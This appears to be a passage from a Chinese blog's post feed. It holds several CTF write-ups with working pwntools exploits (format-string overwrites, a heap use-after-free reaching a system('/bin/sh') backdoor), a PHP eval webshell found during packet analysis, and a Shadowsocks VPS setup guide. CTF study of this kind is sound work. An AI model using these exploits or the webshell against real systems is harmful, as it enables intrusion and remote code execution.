[rsp+14h] [rbp-4h] v2 = 1; if ( 2 * a1[8] != a1[9] ) v2 = 0; return v2;&#125; 计算得出第十一个数字： 123456789101112_BOOL8 __fastcall check11(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, char *a8)&#123; __int64 v8; // rcx __int16 sum; // ax v8 = (unsigned __int8)a8[9]; sum = 0; do sum += v8--; while ( v8 ); return a8[10] == HIBYTE(sum) * (_BYTE)sum;&#125; 逻辑相对比较常规，但做下来有些耗时。最后写出脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647primes = []for i in range(2, 256): for j in range(2, i): if i % j == 0: break else: primes.append(i)s = 11 * [0]# s[0], s[1] = 37, 94 # %^Jv!_j0\"Dz ==&gt; wrongs[0], s[1] = 47, 74 # /JTl!_j0\"Dz ==&gt; rightassert(s[0] * s[1] == 3478)s[2] = s[0] ^ s[1] ^ 49for i in range(s[2] + 1, 256): if i * i % 256 == s[2] * s[2] % 256: s[3] = i breakdef get456(): for i in primes: for j in primes: if i &gt; 32 and j &gt; 32 and (i ^ j) % 256 == 126: if j - 42 in primes and 2 * j &lt; 256: return (i, j, 2 * (j - 42))s[4], s[5], s[6] = get456()for i in range(48, 58): if 4 * (i &gt;&gt; 2) == i: s[7] = i breaks[8] = 0x12 ^ s[7]s[9] = 2 * s[8]s[10] = 0x7Afor c in s: assert(c &gt; 32)print(''.join(map(chr, s))) 据说这里可以符号执行用 angr 做。 MISC-Blind Datexxd一下文件头，根据 jpeg 文件头特征可以发现每四字节被倒过来了： 1234567891011~ &gt; xxd BlindDate.jpeg | head00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101 ....FJ....FI`...00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000 ..`.\"...fixEMM..00000020: 0000 2a00 0100 0800 0300 1201 0100 0000 ..*.............00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544 ............kcuD00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1 ...y.......Kh~..00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562 :pttsn//oda.c.eb00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c x/mo1/pa./0.px?&lt;00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22 ekcaeb t=nig...\"00000080: 6469 2022 3557 223d 704d 304d 6968 6543 di \"5W\"=pM0MiheC00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439 erzHTNzSckzc?\"d9 用脚本过逆回来： 12345678910f = open('BlindDate.jpeg', 'rb')s = f.read()f.close()data = ''for i in range(0, len(s), 4): data += s[i:i + 4][::-1]new_f = open('re_BlindData.jpeg', 'wb')new_f.write(data) strings一下新文件，发现一串 base64 字符串： 1Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK 解开后发现是盲文： 123.. . .. .. . .. .. . .. . ... . . . . . . . .. .. . .. . . 翻译一下之后是：F4C3P4LM binwalk一下新文件，分解出一个带密码的 7z 压缩文件。把上面的字符串作为密码解开，得到 flag 文本，是 brainfuck： 1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++. 解密得到 flag：noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?} PWN-believeMe做出的第一道格式化字符串。拿到题目先 \bfile\b 一下，然后再看看开了什么保护： 123456789[noxCTF-believeMe] file believeMe 1:36:01believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped[noxCTF-believeMe] checksec believeMe 1:36:06[*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 然后拖进 ida 中查看： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[40]; // [esp+14h] [ebp-34h] unsigned int v5; // [esp+3Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(aSomeoneToldMeT); fflush(stdout); fgets(s, 39, stdin); s[strcspn(s, \"\\n\")] = 0; printf(s); fflush(stdout); return 0;&#125; main 函数中对字符串长度做了限制，并且存在明显的格式化字符串漏洞。然后很容易发现有一个奇怪的函数noxFlag： 12345678910111213141516171819202122232425void __noreturn noxFlag()&#123; char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(\"flag.txt\", \"r\"); puts(s); fflush(stdout); if ( stream ) &#123; for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) &#123; putchar(i); fflush(stdout); &#125; fflush(stdout); fclose(stream); &#125; else &#123; puts(\"Can't read file \\n\"); fflush(stdout); &#125; exit(0);&#125; 由于题目中提到环境是不开启 ASLR 的，那么这道题的思路就很明确：通过格式化字符串，泄漏出 main 函数 ret 的地址，修改为noxFlag的地址，得到flag.txt的内容。 gdb 调试，通过查看栈上的内容得到 \b\b 字符串的 offset： 1234567891011gdb-peda$ stack 200000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\\n&apos;)0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad22880012| 0xffffcebc --&gt; 0x7f170016| 0xffffcec0 --&gt; 0xffffffff0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)0032| 0xffffced0 --&gt; 0x80000036| 0xffffced4 (&quot;AAAA&quot;) 关于 ret 的地址，也通过在栈上的观察： 1234567890084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x10088| 0xffffce98 --&gt; 0x00092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0--More--(25/50)0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db00104| 0xffffcea8 --&gt; 0x00108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0112| 0xffffceb0 --&gt; 0x1 可以看到本地 \bret 的地址即为0xffffceac，然后需要利用漏洞，泄漏出远程的地址。仔细观察发现 offset 为 84 和 112 处的联系，即只需要泄漏出 offset 为 84 的 \b 内容，再将结果减去 4 即能 \b 得到远程服务器上 ret 的地址。 格式化字符串漏洞的 payload 还可以利用pwntools中的一个函数fmtstr_payload，用于自动生成格式化字符串。fmtstr_payload有三个参数：第一个参数是int，用于表示取参数的偏移个数；第二个参数是字典，字典的意义是往key的地址，写入value的值；第三个参数write_size，可以改变 payload 的形式，\bbyte对应%hhn，short对应%hn，int对应%n。 最后可以写出 exp： 12345678910111213141516171819from pwn import *# context.log_level = 'DEBUG'local = 0if local: p = process('./believeMe')else: p = remote('18.223.228.52', 13337)flag_addr = 0x0804867Bret_addr = 0xffffdd2c # local: 0xffffd2bcoffset = 9# payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset# payload = '0x%21$08x' # test ret_addr# payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size='short')assert(len(payload) &lt; 39)p.recvuntil('????')# gdb.attach(p, 'b *0x80487d3\\nc')p.sendline(payload)p.interactive() PWN-The Name Calculator\b 又是一道格式化字符串，还涉及到栈溢出。\b 先反编译查看 main 函数： 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+Ch] [ebp-2Ch] int v4; // [esp+28h] [ebp-10h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(\"What is your name?\"); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) &#123; secretFunc(); &#125; else &#123; puts(\"I've heard better\"); fflush(stdout); &#125; exit(0);&#125; 查看一下 v4 和 buf 在内存中的位置，发现可以溢出进入secretFunc，看一下这个函数： 123456789101112131415161718192021222324252627282930313233int secretFunc()&#123; unsigned int v0; // eax int *i; // [esp+8h] [ebp-40h] ssize_t v3; // [esp+18h] [ebp-30h] int buf[7]; // [esp+20h] [ebp-28h] unsigned int v5; // [esp+3Ch] [ebp-Ch] void *retaddr; // [esp+4Ch] [ebp+4h] v5 = __readgsdword(0x14u); v0 = 0; do &#123; buf[v0] = 0; ++v0; &#125; while ( v0 &lt; 7 ); retAddr = (int)retaddr; puts(\"Say that again please\"); fflush(stdout); v3 = read(0, buf, 0x1Bu); *((_BYTE *)buf + v3) = 0; fflush(stdin); for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; puts(\"Your name was encrypted using the best encryption in the world\"); printf(\"This is your new name: \"); printf((const char *)buf); fflush(stdout); if ( retaddr != (void *)retAddr ) exit(1); return 0;&#125; 中间对输入的 buf 进行了异或，从第一字符开始，步长为 1，每次取 \b 四个字符，\b 转换为 int 型 \b 后与特定数字异或，循环直到倒数第四个字符。后面 buf 这里的 \bprintf明显存在格式化字符串。\b 然后又发现了一个superSecretFunc函数： 123456int superSecretFunc()&#123; printf(\"Here is your flag: \"); fflush(stdout); return system(\"cat flag\");&#125; 大概知道了是通过格式化字符串修改某个 ret 的地址 \b，然后在superSecretFunc这里执行 \bcat flag。回头再看到 main 函数调用了exit，这里就可以通过修改exit的 got 表实现跳转。然后先通过 gdb 调试找到 \b 地址： 12345678gdb-peda$ pdis exitDump of assembler code for function exit@plt: 0x08048470 &lt;+0&gt;: jmp DWORD PTR ds:0x804a024 0x08048476 &lt;+6&gt;: push 0x30 0x0804847b &lt;+11&gt;: jmp 0x8048400End of assembler dump.gdb-peda$ x/wx 0x804a0240x804a024: 0x08048476 查看栈上分布，得到 \b 字符串的偏移： 123456789101112130000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0008| 0xffbc27e8 --&gt; 0x1b0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;: add esp,0x10)0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;: add esi,0x149e29)0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db00024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;: jmp 0x80487bd &lt;main+147&gt;)0032| 0xffbc2800 (&quot;SA&#123;_&quot;)0036| 0xffbc2804 --&gt; 0x00040| 0xffbc2808 --&gt; 0x20044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db00048| 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;) 最后 \b 的 exp： 123456789101112131415161718192021222324252627282930313233from pwn import *# context.log_level = 'DEBUG'local = 1if local: p = process('./CAL')else: p = remote('chal.noxale.com', 5678)def xor_op(s): xor_num = 0x5F7B4153 l = list(s) for i in range(len(l) - 4): t = ''.join(l[i:i + 4]) l[i:i + 4] = list(p32(u32(t) ^ xor_num)) return ''.join(l)offset1 = 28v4 = 0x6A4B825offset2 = 12exit_got = 0x804a024super_addr = 0x08048596# gdb.attach(p, 'b *0x8048656')p.recvuntil('name?')payload1 = 'A' * offset1 + p32(v4)p.send(payload1)p.recvuntil('please')payload2 = xor_op(p32(exit_got) + '%34194c%12$hn')assert(len(payload2) &lt; 0x1B)p.send(payload2)p.interactive() 参考网站https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-Stringhttps://github.com/imthoe/noxCTF/tree/master/BlindDatehttps://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"利用VPS搭建Shadowsocks科学上网","slug":"利用VPS搭建Shadowsocks科学上网","date":"2018-09-08T03:37:55.000Z","updated":"2019-08-26T05:53:53.640Z","comments":true,"path":"2018/09/08/利用VPS搭建Shadowsocks科学上网/","link":"","permalink":"blog.b3ale.cn/2018/09/08/利用VPS搭建Shadowsocks科学上网/","excerpt":"记录一下自己搭小飞机的过程。","text":"记录一下自己搭小飞机的过程。 第一步-租服务器先放一些国外的一些 VPS 提供商：vultr、linode、搬瓦工。我是在 vultr 上租的服务器。 首先注册账号，进入 \b 个人界面后，在 Billing 页面使用 Alipay 充值。 去 Servers 页面，\b 选择服务器的地点，我选了 Los Angeles。 然后选择 os，我的话选了 CentOS。 然后 Size 我是选了$3.5/mo，因为最便宜的$2.5/mo 只支持 ipv6。 然后点击 Deploy Now，过一会儿就可以得到这台服务器的基本信息。 第二步-ssh 远程连接mac 的话我是用的 SSH Shell 来连，如果是 windows 可以用 Putty。 按照给出的信息连一下就行了（\b 端口 22）。 第三步-搭建\b 在服务器上运行一下命令： 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 然后按照提示选择脚本，我选了 Shadowsocks-Go，之后 \b 也是无脑跟着指令一步一步进行，安装完成后就会得到 \b： 12345678910111213141516Starting shadowsocks-go (via systemctl): [ OK ]Congratulations, Shadowsocks-Go server install completed!Your Server IP : xxx.xxx.xxx.xxxYour Server Port : xxxxxYour Password : xxxxxxxxxxxYour Encryption Method: xxxxxxxxxxxYour QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients) ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=Your QR Code has been saved as a PNG file path: /root/shadowsocks_go_qr.pngWelcome to visit: https://teddysun.com/486.htmlEnjoy it! 第四步-科学上网我把 \b 每个平台上的小飞机都放在我的 github 上了。\b 只要将上面的信息填进去就能科学上网啦。 参考网站https://www.diycode.cc/topics/738","categories":[],"tags":[{"name":"note","slug":"note","permalink":"blog.b3ale.cn/tags/note/"}]},{"title":"2018-安恒杯八月月赛","slug":"2018-安恒杯八月月赛","date":"2018-08-31T14:34:15.000Z","updated":"2019-08-26T01:14:35.667Z","comments":true,"path":"2018/08/31/2018-安恒杯八月月赛/","link":"","permalink":"blog.b3ale.cn/2018/08/31/2018-安恒杯八月月赛/","excerpt":"放暑假玩了几天，慢慢整理这几次比赛。","text":"放暑假玩了几天，慢慢整理这几次比赛。 CRYPTO-爬坡道提示明显是希尔加密，了解一下希尔加密写一下脚本或者在线解密。 123456789101112131415161718192021from numpy import *flag = ''mat_key = mat([[3, 1], [2, 1]])enc = 'mttpjbpexfdzcegtdzeanutg'# pla = 'thehillisveryinteresting'# 字符串转为数字enc1 = []for i in range(len(enc)): enc1.append(ord(enc[i]) - ord('a'))# 计算明文并转化为字符串res = mat_enc * mat_key.Ires = res.reshape(1, len(enc1)).tolist()[0]flag = ''for i in range(len(res)): flag += chr(ord('a') + (int(round(res[i])) % 26))# 输出flagprint flag 最后提交 flag 的 md5 值。 RE-Dig The Way题目里直接给了一个 idb 文件，用 ida 打开分析。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int result; // eax int v5; // eax char flag; // [esp+11h] [ebp-3Fh] int a[0]; // [esp+28h] [ebp-28h] int a[2]; // [esp+30h] [ebp-20h] int a[4]; // [esp+38h] [ebp-18h] int a[5]; // [esp+3Ch] [ebp-14h] signed int (__cdecl *_func0)(char *, int, int); // [esp+40h] [ebp-10h] int (__cdecl *_func1)(char *, int, int); // [esp+44h] [ebp-Ch] int (__cdecl *_func2)(char *, int, int); // [esp+48h] [ebp-8h] int i; // [esp+4Ch] [ebp-4h] __main(); _func0 = swap; // swap pos _func1 = trans1; // |x + y| - |x| - |y| + 2 _func2 = trans2; // |x| + |y| - |x + y| + 2 v3 = 0; do &#123; *(int *)((char *)&amp;a[0] + v3) = 0; // init array v3 += 4; &#125; while ( v3 &lt; 24 ); printf(\"input flag:\"); scanf(\"%s\", &amp;flag); if ( strcmp(&amp;flag, \"flag&#123;\") &lt; 0 ) // 1.flag head return 0; if ( check(&amp;flag) ) // 2.flag all-misc &#123; a[5] = getValue(&amp;flag); if ( a[5] &gt; 0 ) // make sure only one solution &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; v5 = (*(&amp;_func0 + i))((char *)&amp;a[0], 4, 5); *(&amp;a[0] + i) = v5; a[5] = -a[4]; &#125; if ( a[2] ) // 3.flag key-point &#123; result = 1; &#125; else &#123; puts(\"Congratulations\"); system(\"PAUSE\"); result = 0; &#125; &#125; else &#123; result = 0; &#125; &#125; else &#123; puts(\"check your flag!\"); result = 0; &#125; return result;&#125; 一开始对输入字符串匹配了flag{，之后有多个函数进行的转换。可以看出最重要的有三个函数： check() getValue() _func2 下面就逐一分析。 check()1234567891011121314bool __cdecl check(_BYTE *a1)&#123; if ( (char)a1[7] + (char)a1[6] != (char)a1[8] ) return 0; if ( (char)a1[10] + (char)a1[9] != (char)a1[11] ) return 0; if ( (char)a1[13] + (char)a1[12] != (char)a1[14] ) return 0; if ( (char)a1[16] + (char)a1[15] != (char)a1[17] ) return 0; if ( (char)a1[19] + (char)a1[18] == (char)a1[20] ) return (a1[8] ^ (unsigned __int8)(a1[11] ^ a1[14] ^ a1[17] ^ a1[21])) == a1[5]; return 0;&#125; 通过这个函数大概可以得到几个字符得到的方式，显然这里用 z3 是很难求解的。 getValue()12345678910int __cdecl getValue(char *a1)&#123; signed int i; // [esp+8h] [ebp-8h] int v3; // [esp+Ch] [ebp-4h] v3 = 0; for ( i = 6; i &lt;= 19; i += 3 ) v3 = 100 * v3 + 10 * (a1[i] - 48) + a1[i + 1] - 48; return v3;&#125; 从第六位开始，每次取三位，每三位取前两位组成数字 v3 并返回。 _func21234567int __cdecl trans2(char *a1, int i, int j)&#123; return abs(*(_DWORD *)&amp;a1[4 * j]) - abs(*(_DWORD *)&amp;a1[4 * j] + *(_DWORD *)&amp;a1[4 * i]) + abs(*(_DWORD *)&amp;a1[4 * i]) + 2;&#125; 简化为|x| + |y| - |x + y| + 2，根据 main 函数中的逻辑，该值应该为 0。但又因为|x| + |y| &gt;= |x + y|，故|x| + |y| - |x + y| + 2 &gt; 0，无法使之为 0。 下面开始对程序逆向分析： 由于第三个函数很难得到 0，可以想到溢出方面，使返回值为0x100000000。x 与 y 的值又因为互为相反数，可以求出|x|和|y|的值，而 y 在内存中的表示即为 x 的补码。得到 x 为 2147483647，y 为 2147483649。 通过 x 的值和 getValue 函数倒推出一部分 flag：flag{x21x47x48x36x47（x 为未知部分）。 根据 check 函数，写个脚本跑出大部分 flag：flag{x21c47k48l36i47k。 最后还有一部分由于不知道第 21 位 flag，猜测应该是}了，通过 check 函数异或后得到：flag{p21c47k48l36i47k} MISC-暴力可解8 位的数字暴力破解得到 zip 密码。 先试着用 stegsolve 把两张图合并无果，猜测是盲水印，用工具 BlindWaterMark，命令为python bwm.py 1.png 2.png flag.png，最后得到 flag。 PWN-Unote21234567root@b1571ee3e5b3:~/tmp# checksec ./Unote[*] '/root/tmp/Unote' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 32 位的堆题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __cdecl __noreturn main()&#123; int v0; // eax char buf; // [esp+18h] [ebp-8h] unsigned int v2; // [esp+1Ch] [ebp-4h] v2 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); printf(\"Please input your username:\"); read(0, &amp;username, 0x1Eu); while ( 1 ) &#123; while ( 1 ) &#123; welcome(); read(0, &amp;buf, 4u); v0 = atoi(&amp;buf); if ( v0 != 2 ) break; delete(); &#125; if ( v0 &gt; 2 ) &#123; if ( v0 == 3 ) &#123; print(); &#125; else &#123; if ( v0 == 4 ) exit(0);LABEL_13: puts(\"Invalid choice\"); &#125; &#125; else &#123; if ( v0 != 1 ) goto LABEL_13; add(); &#125; &#125;&#125; 在delete这里看到free之后指针没有置空，可以 uaf： 12345678910111213141516171819202122unsigned int delete()&#123; int idx; // [esp+14h] [ebp-14h] char buf; // [esp+18h] [ebp-10h] unsigned int v3; // [esp+1Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= size ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( !ptr[idx] ) return __readgsdword(0x14u) ^ v3; free(*((void **)ptr[idx] + 1)); // uaf free(ptr[idx]); puts(\"Success\"); return __readgsdword(0x14u) ^ v3;&#125; add把每个 chunk 的第一个部分置为puts函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add()&#123; _DWORD *v0; // ebx signed int i; // [esp+1Ch] [ebp-1Ch] int size; // [esp+20h] [ebp-18h] char buf; // [esp+24h] [ebp-14h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( ::size &lt;= 2 ) &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); if ( !ptr[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; *(_DWORD *)ptr[i] = puts_func; printf(\"Note size :\"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, *((void **)ptr[i] + 1), size); puts(\"Success !\"); ++::size; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(\"Full\"); &#125; return __readgsdword(0x14u) ^ v5;&#125; print调用每个 chunk 的puts函数： 12345678910111213141516171819unsigned int print()&#123; int idx; // [esp+14h] [ebp-14h] char buf; // [esp+18h] [ebp-10h] unsigned int v3; // [esp+1Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= size ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( ptr[idx] ) (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]); return __readgsdword(0x14u) ^ v3;&#125; 程序中还留了一个后门： 1234int __cdecl hack(int a1)&#123; return system(*(const char **)(a1 + 4));&#125; 可以在输入 username 的时候把/bin/sh传上去，然后利用 uaf 在第二次 malloc 的时候把后门函数和 buf 的地址传上去。 思路是 malloc 两次大一点的 chunk，然后先后 free 掉。再 malloc 一个大小为0x8的 chunk，会把之前两个存放puts函数的 chunk 取出来。free 两次之后四个 chunk 如下： 123456789101112131415161718192021222324252627282930313233343536assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80000$45 = &#123; prev_size = 0x0, size = 0x11, fd = 0x0, bk = 0x8e80018, fd_nextsize = 0x0, bk_nextsize = 0x29&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80010$46 = &#123; prev_size = 0x0, size = 0x29, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80038$47 = &#123; prev_size = 0x0, size = 0x11, fd = 0x8e80000, bk = 0x8e80050, fd_nextsize = 0x0, bk_nextsize = 0x29&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80048$48 = &#123; prev_size = 0x0, size = 0x29, fd = 0x8e80010, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 然后可以把puts改成system后门，直接调用print就能 getshell。Exploit： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'i386'context.terminal = ['tmux', 'sp', '-h']local = 1if local: p = process('./Unote')else: p = remote('101.71.29.5', 10001)elf = ELF('./Unote')puts_got = elf.got['puts']hack = 0x08048672gdb.attach(p)def cmd(c): p.recvuntil('choice :') p.send(str(c))def add(size, content): cmd(1) p.recvuntil('Note size :') p.send(str(size)) p.recvuntil('Content :') p.send(content)def delete(idx): cmd(2) p.recvuntil('Index :') p.send(str(idx))def show(idx): cmd(3) p.recvuntil('Index :') p.send(str(idx))p.recvuntil('Please input your username:')str_bin_sh = 0x0804A070p.send('/bin/sh\\x00')add(0x20, 'A') # 0add(0x20, 'B') # 1delete(0)delete(1)add(0x8, p32(hack) + p32(str_bin_sh))show(0)p.interactive() 流量分析相对系统地学习了一下 wireshark 的使用和流量分析。 前置知识 过滤 IP： ip.src eq x.x.x.x or ip.dst eq x.x.x.x ip.addr eq x.x.x.x 过滤端口： tcp.port eq 80 or udp.port eq 80 过滤 MAC eth.dst == A0:00:00:04:C5:84 http 模式过滤： http.request.method == &quot;GET&quot; http.request.method == &quot;POST&quot; http.request.uri == &quot;/img/logo-edu.gif&quot; http contains &quot;GET&quot; http contains &quot;HTTP/1.&quot; http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot; webone.pcap协议分级发现大部分为 http，重点关注对话的 80 端口，基本可以确定黑客的地址。 黑客使用的扫描器 扫描器很容易发现： 或者可以用http contains查找常用的几种扫描器。 黑客扫描到的登陆后台 1http.request.method == &quot;POST&quot; 得知黑客使用了 awvs 后再次筛选可以找到登录后台： 黑客登陆 web 后台使用的账号密码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot; 黑客上传的 webshell 内容的 base 编码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot; 即将@eval($_POST[&#39;1234&#39;])base64 加密后提交。 黑客在 robots.txt 中找到的 flag 1http contains &quot;Disallow&quot; 黑客找到的数据库密码 1http contains &quot;web&quot; and http contains &quot;password&quot; 被黑客攻击的 web 服务器网卡内网 ip 1http contains &quot;eth&quot; webtwo.pcap 黑客在数据库中找到的 hash_code 1mysql contains &quot;hash_code&quot; 黑客破解账号 ijnu@test.com 得到的密码 1mysql contains &quot;ijnu@test.com&quot; 找到密码后 md5 解密： mailtwo.pcap &amp;&amp; mailtwo1.pcap 黑客登陆 mail 系统使用的账号 可以社工，直接用 web 的账号密码。 正经做法是先在 mailtwo.pcap 中找到加密算法： 12345678var key_hash = CryptoJS.MD5(\"1234567812345678\");var key = CryptoJS.enc.Utf8.parse(key_hash);var iv = CryptoJS.enc.Utf8.parse(\"1234567812345678\");form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding&#125;); 在 mailtwo1.pcap 中再过滤： 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59 找到被加密的密码： 最后根据算法和已被加密的密码得到明文密码。 vpnone.pcap &amp;&amp; vpntwo.pcapvpnone.pcap 在尝试登陆 vpn，vpntwo.pcap 成功登陆了 vpn。 黑客获得的 vpn、ip 在统计-&gt;端点中流量最大的为黑客 ip。 参考网站： http://foreversong.cn/archives/216http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2017-CSAW-Quals-realism","slug":"2017-CSAW-Quals-realism","date":"2018-08-30T14:09:36.000Z","updated":"2020-01-24T08:38:54.429Z","comments":true,"path":"2018/08/30/2017-CSAW-Quals-realism/","link":"","permalink":"blog.b3ale.cn/2018/08/30/2017-CSAW-Quals-realism/","excerpt":"学习 z3 时复现的一道题，了解了 SSE 指令以及学习了 gdb 和 qemu 之间的调试。","text":"学习 z3 时复现的一道题，了解了 SSE 指令以及学习了 gdb 和 qemu 之间的调试。 Analysis12$ file main.binmain.bin: 